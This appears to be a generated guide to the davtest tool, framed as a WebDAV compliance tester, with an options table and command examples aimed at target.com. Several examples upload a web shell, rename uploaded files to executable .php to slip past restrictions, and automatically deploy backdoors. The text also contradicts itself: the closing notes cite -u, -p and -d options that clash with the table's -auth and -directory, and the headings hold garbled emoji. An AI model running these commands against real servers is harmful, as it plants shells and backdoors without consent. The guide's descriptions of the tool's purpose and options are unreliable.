`davtest` is a command-line tool designed to test the compliance and functionality of WebDAV servers. It performs a series of automated tests to verify that the server correctly implements the WebDAV protocol and handles various operations as expected.  It's a valuable tool for administrators and developers who need to ensure their WebDAV servers are working correctly.

**What `davtest` Does:**

`davtest` sends a range of HTTP requests to the WebDAV server, exercising different WebDAV methods (like `PROPFIND`, `MKCOL`, `PUT`, `GET`, `DELETE`, `MOVE`, `COPY`, etc.) and checking the server's responses. It then reports on any errors or inconsistencies it finds.

**Key Features and Capabilities:**

*   **Comprehensive Testing:** Covers a wide range of WebDAV functionalities.
*   **Command-Line Interface:** Suitable for scripting and automation.
*   **Customizable:** Allows you to specify which tests to run and configure various options.
*   **Detailed Reporting:** Provides detailed output on the test results.

**How to Use `davtest`:**

1.  **Installation:** `davtest` is often available in the package repositories of many Linux distributions. For example, on Debian/Ubuntu:

    ```bash
    sudo apt-get install davtest
    ```

    On macOS, you might need to use a package manager like Homebrew:

    ```bash
    brew install davtest
    ```

### **üîπ Key Options & Usage**
| **Option** | **Description** | **Example** |
|------------|---------------|------------|
| `-auth user:pass` | Perform **authenticated testing** with HTTP Basic Auth. | `davtest -url http://example.com/ -auth admin:12345` |
| `-realm <realm>` | Specify authentication **realm**. | `davtest -url http://example.com/ -auth admin:12345 -realm "Restricted"` |
| `-cleanup` | **Delete all uploaded files** after testing. | `davtest -url http://example.com/ -cleanup` |
| `-directory <dir>` | Specify a **directory** name for uploads. | `davtest -url http://example.com/ -directory test_upload` |
| `-move` | Upload text files first, then **MOVE** them to executable. | `davtest -url http://example.com/ -move` |
| `-copy` | Upload text files first, then **COPY** them to executable. | `davtest -url http://example.com/ -copy` |
| `-nocreate` | **Skip directory creation** during testing. | `davtest -url http://example.com/ -nocreate` |
| `-quiet` | **Silent mode** (only prints summary). | `davtest -url http://example.com/ -quiet` |
| `-rand <string>` | Use a specific **random string** for filenames. | `davtest -url http://example.com/ -rand xyz123` |
| `-sendbd auto` | **Send backdoors automatically** if uploads succeed. | `davtest -url http://example.com/ -sendbd auto` |
| `-sendbd ext` | **Send backdoors** based on file extension. | `davtest -url http://example.com/ -sendbd ext` |
| `-uploadfile <file>` | **Upload a specific file** (requires `-uploadloc`). | `davtest -url http://example.com/ -uploadfile shell.php -uploadloc /uploads/` |
| `-uploadloc <path>` | **Upload file to a specific location**. | `davtest -url http://example.com/ -uploadloc /uploads/shell.php` |

### **üîπ Example Usage**
#### **1Ô∏è‚É£ Test a WebDAV Server for File Uploads**
```sh
davtest -url http://target.com/webdav/
```
üìå **Checks if the server allows uploading and executing files.**

#### **2Ô∏è‚É£ Test an Authenticated WebDAV Server**
```sh
davtest -url http://target.com/webdav/ -auth admin:password123
```
üìå **Uses HTTP authentication to test access-protected WebDAV servers.**

#### **3Ô∏è‚É£ Upload and Auto-Remove Files**
```sh
davtest -url http://target.com/webdav/ -cleanup
```
üìå **Ensures no files are left behind after testing.**

#### **4Ô∏è‚É£ Attempt to Bypass File Execution Restrictions**
```sh
davtest -url http://target.com/webdav/ -move
```
üìå **Uploads a file as `.txt` and renames it to `.php` to check execution.**

#### **5Ô∏è‚É£ Upload a Custom Web Shell**
```sh
davtest -url http://target.com/webdav/ -uploadfile shell.php -uploadloc /uploads/
```
üìå **Attempts to upload a custom shell to `/uploads/`.**

#### **6Ô∏è‚É£ Test and Deploy Backdoors**
```sh
davtest -url http://target.com/webdav/ -sendbd auto
```
üìå **Automatically uploads a backdoor if an executable file type is allowed.**

**Use Cases:**

*   **WebDAV Server Testing:** Verifying the correct implementation of WebDAV on a server.
*   **Troubleshooting:** Identifying problems with a WebDAV server.
*   **Development:** Testing WebDAV server implementations during development.

**Important Considerations:**

*   **Authentication:** If the WebDAV server requires authentication, use the `-u` and `-p` options.
*   **Test Directory:** `davtest` usually creates a temporary directory for testing.  Make sure the user running `davtest` has write permissions in the location where the directory will be created.  The `-d` option lets you specify the test directory.
*   **Interpreting Results:** `davtest`'s output can be quite detailed.  Pay close attention to any errors or failures reported.
*   **Server Impact:** Running a full `davtest` suite can put some load on the WebDAV server.  Consider running it during off-peak hours.

`davtest` is a very useful tool for ensuring the proper functionality of WebDAV servers.  Its comprehensive tests and clear reporting make it a valuable asset for WebDAV administrators and developers.  Remember to use it responsibly and be aware of its potential impact on the server.
